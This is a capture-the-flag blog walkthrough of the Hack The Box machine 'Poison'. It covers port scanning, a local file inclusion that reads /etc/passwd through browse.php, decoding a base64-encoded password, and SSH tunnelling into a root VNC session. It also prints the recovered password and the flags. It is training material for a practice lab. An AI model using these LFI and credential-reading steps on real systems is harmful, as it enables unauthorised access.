---
id: 32
title: 'Poison &#8211; Hackthebox'
date: 2018-04-11T13:52:54+01:00
author: rowbot
excerpt: |
  Skills Required
  Basic knowledge of Linux
  Enumerating ports and services
  Basic understanding of cryptography
  
  Skills Learned
  SSH Tunneling
  VNCViewer commands
  Grep -vE to select non-matching lines
layout: post
guid: https://offsecnewbie.wordpress.com/?p=32
permalink: /2018/04/11/poison-hack-the-box/
timeline_notification:
  - "1523454774"
image: /wp-content/uploads/2018/04/poison.png
categories:
  - Hackthebox
---
**Skills Required**  
Basic knowledge of Linux  
Enumerating ports and services  
Basic understanding of cryptography

**Skills Learned**  
SSH Tunneling  
VNCViewer commands  
Grep -vE to select non-matching lines

START

Initial port scan

<pre>[root:~/Desktop/poison]# nmap -p- 10.10.10.84 -oA portscan

Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-09 15:11 BST

Nmap scan report for 10.10.10.84

Host is up, received echo-reply ttl 63 (0.035s latency).

Not shown: 54531 filtered ports, 10999 closed ports

Reason: 54531 no-responses and 10999 resets

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT STATE SERVICE REASON

22/tcp open ssh syn-ack ttl 63

80/tcp open http syn-ack ttl 63

5802/tcp open vnc-http-2 syn-ack ttl 63

5902/tcp open vnc-2 syn-ack ttl 63

6002/tcp open X11:2 syn-ack ttl 63</pre>

Enum Ports

<pre>[root:~/Desktop/poison]# nmap -sC -sV -p 22,80,5802,5902,6002 10.10.10.84 -oA enumports

Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-09 15:13 BST

Nmap scan report for 10.10.10.84

Host is up, received echo-reply ttl 63 (0.033s latency).

PORT STATE SERVICE REASON VERSION

22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)

| ssh-hostkey: 

| 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)

| 256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)

|_ 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)

80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)

|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32

https://wordpress.com/post/offsecnewbie.wordpress.com/32|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

5802/tcp open http syn-ack ttl 63 Bacula http config

5902/tcp open vnc syn-ack ttl 63 VNC (protocol 3.8)

| vnc-info: 

| Protocol version: 3.8

| Security types: 

| VNC Authentication (2)

| Tight (16)

| Tight auth subtypes: 

|_ STDV VNCAUTH_ (2)

6002/tcp open X11 syn-ack ttl 63 (access denied)

Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 24.27 seconds</pre>

nmap http enum

<pre>[root:~/Desktop/poison]# nmap -Pn -p 80 --script http-enum 10.10.10.84

Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-09 15:15 BST

Nmap scan report for 10.10.10.84

Host is up, received user-set (0.032s latency).

PORT STATE SERVICE REASON

80/tcp open http syn-ack ttl 63

| http-enum: 

| /info.php: Possible information file

|_ /phpinfo.php: Possible information file

Nmap done: 1 IP address (1 host up) scanned in 3.42 seconds</pre>

Here is what we can see from the website.

<img class="alignnone wp-image-33 size-full" src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/poison-port-80.png?resize=680%2C246" alt="poison port 80" width="680" height="246" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/poison-port-80.png?w=916 916w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/poison-port-80.png?resize=300%2C108 300w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/poison-port-80.png?resize=768%2C278 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> I entered testscript.php in the field and i got an error:

<pre><b>Warning</b>: include(testscript.php): failed to open stream: No such file or directory in <b>/usr/local/www/apache24/data/browse.php</b> on line <b>2</b></pre>

<pre><b>Warning</b>: include(): Failed opening 'testscript.php' for inclusion (include_path='.:/usr/local/www/apache24/data') in <b>/usr/local/www/apache24/data/browse.php</b> on line <b>2</b></pre>

Now to search for possible LFI

<pre>[root:~/Desktop/poison]# fimap -u "http://10.10.10.84/browse.php?file=" [2/1957]

fimap v.1.00_svn (My life for Aiur) 

:: Automatic LFI/RFI scanner and exploiter 

:: by Iman Karim (fimap.dev@gmail.com)

SingleScan is testing URL: 'http://10.10.10.84/browse.php?file='

[14:53:52] [OUT] Inspecting URL 'http://10.10.10.84/browse.php?file='...

[14:53:52] [INFO] Fiddling around with URL...

[14:53:52] [OUT] [PHP] Possible file inclusion found! -&gt; 'http://10.10.10.84/browse.php?file=z2hu63pz' with Parameter 'file'.

[14:53:52] [OUT] [PHP] Identifying Vulnerability 'http://10.10.10.84/browse.php?file=' with Parameter 'file'...

[14:53:53] [INFO] Scriptpath received: '/usr/local/www/apache24/data'

[14:53:53] [INFO] Operating System is 'Unix-Like'.

[14:53:53] [INFO] Testing file '/etc/passwd'...

[14:53:53] [INFO] Testing file '/proc/self/environ'...

[14:53:53] [INFO] Testing file 'php://input'...

....

....

########################################################

#[1] Possible PHP-File Inclusion #

########################################################

#::REQUEST #

# [URL] http://10.10.10.84/browse.php?file= #

# [HEAD SENT] #

#::VULN INFO #

# [GET PARAM] file #

# [PATH] /usr/local/www/apache24/data #

# [OS] Unix #

# [TYPE] Absolute Clean #

# [TRUNCATION] No Need. It's clean. #

# [READABLE FILES] #

# [0] /etc/passwd #

########################################################</pre>

Got access to the /etc/passwd file

<pre>[root:~/Desktop/poison]# curl -s http://10.10.10.84/browse.php\?file\=/etc/passwd

root:*:0:0:Charlie &:/root:/bin/csh

toor:*:0:0:Bourne-again Superuser:/root:

daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin

operator:*:2:5:System &:/:/usr/sbin/nologin

bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin

tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin

kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin

games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin

news:*:8:8:News Subsystem:/:/usr/sbin/nologin

man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin

sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin

smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin

mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin

bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin

unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin

proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin

_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin

_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin

uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico

pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin

auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin

www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin

_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin

hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin

nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin

_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin

messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin

avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin

cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin

charix:*:1001:1001:charix:/home/charix:/bin/csh</pre>

I copied that to a file called passwdfile then did an inverted grep search of that file pulling out the users that have login abilities. I must remember that command in future its very useful!

<pre>[root:~/Desktop/poison]# nano passwdfile

[root:~/Desktop/poison]# grep -vE nologin passwdfile 

root:*:0:0:Charlie &:/root:/bin/csh

toor:*:0:0:Bourne-again Superuser:/root:

uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico

charix:*:1001:1001:charix:/home/charix:/bin/csh</pre>

So we have 4 users will login abilities: root, a user toor with superuser access, uucp &#8211; no clue what this user has and what looks like a started user charix. Lets save them off to a file users. I tried sshing some of those users with a few random passwords &#8211; no luck (didn&#8217;t expect anything but no harm in trying!)

Okay looking at the main webpage again I added the file names to see if i can access them

<pre>ini.php, info.php, listfiles.php, phpinfo.php</pre>

listfiles.php gave me

<pre id="line1">Array

(

    [0] =&gt; .

    [1] =&gt; ..

    [2] =&gt; browse.php

    [3] =&gt; index.php

    [4] =&gt; info.php

    [5] =&gt; ini.php

    [6] =&gt; listfiles.php

    [7] =&gt; phpinfo.php

    [8] =&gt; pwdbackup.txt

)</pre>

I think i nearly broke the keyboard with excitement typing pwdbackup.txt in the to web address bar! We&#8217;re getting somewhere!

<pre>This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU

bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS

bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW

M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs

WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy

eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G

WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw

MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa

T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k

WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk

WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0

NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT

Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz

WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW

VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO

Ukd4RVdub3dPVU5uUFQwSwo=</pre>

I went to https://codebeautify.org/base64-decode and input the code. I copied the code from the several times from the decoded and pasted into the coded section ( probably 13 as the previous web page suggested ) and got something that looked like the password for user charix

<pre>The password is 

Charix!2#4%6&8(0

I ssh'd in using that password

[root:~/Desktop/poison]# ssh charix@10.10.10.84

Password for charix@Poison:

Last login: Mon Apr 9 15:44:16 2018 from :2

FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

........

........

Edit /etc/motd to change this login announcement.

Want to go the directory you were just in?

Type "cd -"

charix@Poison:~ % ls -l │

total 44 │

-rw-r----- 1 root charix 166 Mar 19 16:35 secret.zip │

-rw-r----- 1 root charix 33 Mar 19 16:11 user.txt │

charix@Poison:~ % cat user.txt │

eaacdfb2d141b72a589233063604209c</pre>

I copied lineenum.py on my kali box and started a webserver so i could download it using wget from the Poison machine.

<img class="alignnone size-full wp-image-36" src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/wget.png?resize=680%2C111" alt="wget" width="680" height="111" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/wget.png?w=1576 1576w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/wget.png?resize=300%2C49 300w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/wget.png?resize=768%2C126 768w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/wget.png?resize=1024%2C168 1024w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/wget.png?w=1360 1360w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> 

I tried to run it but got an error Command not found.

<pre>charix@Poison:~ % ./linenum.sh 

./linenum.sh: Command not found. 

carix@Poison:~ %</pre>

Not sure whats going on there. Not deterred I downloaded the secret.zip file to kali machine using Python&#8217;s SimpleHTTPServer.

<pre>[root:~/Desktop/poison]# unzip secret.zip 

COPYRIGHT entropy libexec proc sys │Archive: secret.zip

bin etc media rescue tmp │[secret.zip] secret password:</pre>

I unzipped secret.zip using the charix password &#8211; password re-usage ftw and got a file called secret. It had strange characters inside it:

<pre>[root:~/Desktop/poison]# cat secret

[|Ֆz!# 

[root:~/Desktop/poison]#</pre>

After sometime (read 2 days) i finally started to make progress. I ran the top command as user Charix and noticed Xvnc was running

<pre>last pid: 88296; load averages: 1.60, 1.67, 1.77 up 1+17:28:06 16:39:27

38 processes: 2 running, 36 sleeping

CPU: 7.1% user, 0.0% nice, 92.5% system, 0.4% interrupt, 0.0% idle

Mem: 4412K Active, 685M Inact, 36M Laundry, 196M Wired, 66M Buf, 44M Free

Swap: 1024M Total, 1492K Used, 1022M Free

Number of processes to show: 

 PID USERNAME THR PRI NICE SIZE RES STATE TIME WCPU COMMAND

 2962 charix 1 103 0 22692K 6648K RUN 23.1H 99.78% Xvnc

 543 root 2 20 0 56320K 3444K select 4:03 0.06% vmtoolsd

88296 charix 1 20 0 20160K 3120K RUN 0:00 0.05% top

 319 root 1 20 0 9560K 3040K select 0:12 0.01% devd

21364 charix 1 20 0 85228K 7388K select 0:01 0.01% sshd

 642 root 1 20 0 20636K 3540K select 0:05 0.01% sendmail

 390 root 1 20 0 10500K 1920K select 0:06 0.00% syslogd

 625 root 1 20 0 99172K 6068K select 0:08 0.00% httpd

 3092 www 1 20 0 99M 7164K lockf 0:02 0.00% httpd

 649 root 1 20 0 12592K 1864K nanslp 0:01 0.00% cron

 3076 www 1 20 0 99M 7260K lockf 0:01 0.00% httpd</pre>

On my kali machine i ran:

<pre>vncviewer 10.10.10.84:5902

Connected to RFB server, using protocol version 3.8

Enabling TightVNC protocol extensions

Performing standard VNC authentication

Password:

Authentication successful

Desktop name "charix's X desktop (Poison:2)"</pre>

I used Charix&#8217;s ssh password: Charix!2#4%6&8(0

<img class="alignnone size-full wp-image-37" src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/desktop.png?resize=652%2C455" alt="desktop" width="652" height="455" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/desktop.png?w=652 652w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/desktop.png?resize=300%2C209 300w" sizes="(max-width: 652px) 100vw, 652px" data-recalc-dims="1" /> 

I can see there are 2 sessions one for root and one for the user charix. Im struggling to find a way to connect to the root session

<pre>charix@Poison:/usr/local/sbin % ps aux | grep vnc

charix 2962 100.0 0.8 24740 8084 1- R Mon15 2584:59.86 Xvnc :2 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /home/charix/.Xauthority -geometry 1024x768 -depth 24 -rfbwait 120000 -rfb

root 529 0.0 0.7 23608 7456 v0- I Sun23 0:00.83 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /r

charix 91126 0.0 0.0 412 316 0 R+ 13:13 0:00.00 grep vnc

charix@Poison:/usr/local/sbin %</pre>

I know that i have to use the secret file I unzipped from the secret.zip file but no idea on how to use it.

I restarted the box out of desperation and started a port scan. This time only 2 ports were open

<pre>[root:~/Desktop/poison]# nmap -p- 10.10.10.84 

Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-11 14:44 BST

Nmap scan report for 10.10.10.84

Host is up, received echo-reply ttl 63 (0.029s latency).

Not shown: 54549 filtered ports, 10984 closed ports

Reason: 54549 no-responses and 10984 resets

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT STATE SERVICE REASON

22/tcp open ssh syn-ack ttl 63

80/tcp open http syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 55.50 seconds</pre>

Okay so i figured i need to use vncviewer to log on to the root&#8217;s vnc account using the secret password. I couldnt do this from charix ssh as I got this error:

<pre>charix@Poison:~ % vncviewer

vncviewer: Command not found.

charix@Poison:~ %</pre>

I needed to use tunneling of some sort. I found <a href="https://bitvijays.github.io/LFC-VulnerableMachines.html#from-nothing-to-unprivileged-shell" target="_blank" rel="noopener">this blog</a> and browsed to Local Port Forwarding.

<pre>ssh sshserver -L &lt;local port to listen&gt;:&lt;remote host&gt;:&lt;remote port&gt;</pre>

<pre>ssh -L 5901:localhost:5901 charix@10.10.10.84</pre>

I am linking the port 5901 on my machine to port 5901 on the machine I want to tunnel to. I am logging in as charix through ssh. So if a service connects to port 5901 on my machine it will be redirected to ssh  to 10.10.10.84 using charix&#8217;s username

On my kali machine i ran this command using the secret i got earlier.

<pre>[root:~/Desktop/poison]# vncviewer localhost:5901 -passwd secret

Connected to RFB server, using protocol version 3.8

Enabling TightVNC protocol extensions

Performing standard VNC authentication

Authentication successful

Desktop name "root's X desktop (Poison:1)"

VNC server default format:

 32 bits per pixel.

 Least significant byte first in each pixel.

 True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0

Using default colormap which is TrueColor. Pixel format:

 32 bits per pixel.

 Least significant byte first in each pixel.

 True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0

Same machine: preferring raw encoding</pre>

<img class="alignnone size-full wp-image-42" src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/root.png?resize=680%2C395" alt="root!" width="680" height="395" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/root.png?w=1097 1097w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/root.png?resize=300%2C174 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/root.png?resize=768%2C446 768w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/root.png?resize=1024%2C595 1024w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> 

I managed to get in as root. It wasn&#8217;t easy to copy the password so I started a python http server to get the flag.

<img class="alignnone wp-image-43 size-full" src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/rootflag.png?resize=466%2C148" alt="rootflag" width="466" height="148" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/rootflag.png?w=466 466w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/rootflag.png?resize=300%2C95 300w" sizes="(max-width: 466px) 100vw, 466px" data-recalc-dims="1" /> 

716d04b188419cf2bb99d891272361f5

FIN

CONCLUSION  
This was tough. I got the user flag without any major difficulties / me throwing tantrums but the root flag had me beat. I knew of ssh tunneling but never used it before. What I think has thrown me off was the fact that there were ports open previously when I was attacking machine and could vnc as charix without any issues. Someone on the htb group said there should only be 2 and I should restart the box. I did this and as you read only 2 ports came up. I think then after I did the ps aux | grep vnc I would see that root vnc was running. Also I did a socket -l to view ports.